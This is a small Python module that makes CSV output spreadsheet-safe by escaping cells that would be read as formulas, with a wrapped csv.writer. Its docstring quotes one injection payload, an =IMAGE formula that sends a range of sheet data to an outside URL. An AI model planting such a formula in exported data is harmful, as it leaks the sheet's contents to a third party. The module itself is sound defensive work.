"""Spreadsheet-safe values. A cell that starts with = + - @ (or a tab / carriage return)
is run as a formula when the CSV or Sheet is opened – a ticket subject like
=IMAGE("https://…"&A1:Z50) could send the sheet's data to someone else. Such text gets a
leading apostrophe (Sheets and Excel show it as plain text); real numbers are left alone."""

from __future__ import annotations

import csv
import re

_NUM = re.compile(r"^[+-]?(\d+([.,]\d+)*|\.\d+)([eE][+-]?\d+)?%?$")


def cell(v):
    if not isinstance(v, str) or not v:
        return v
    if v[0] in "=+-@\t\r" and not _NUM.match(v.strip()):
        return "'" + v
    return v


def row(values):
    return [cell(v) for v in values]


class writer:
    """csv.writer that makes every cell spreadsheet-safe."""

    def __init__(self, fh, *a, **k):
        self._w = csv.writer(fh, *a, **k)

    def writerow(self, r):
        return self._w.writerow(row(r))

    def writerows(self, rows):
        for r in rows:
            self.writerow(r)
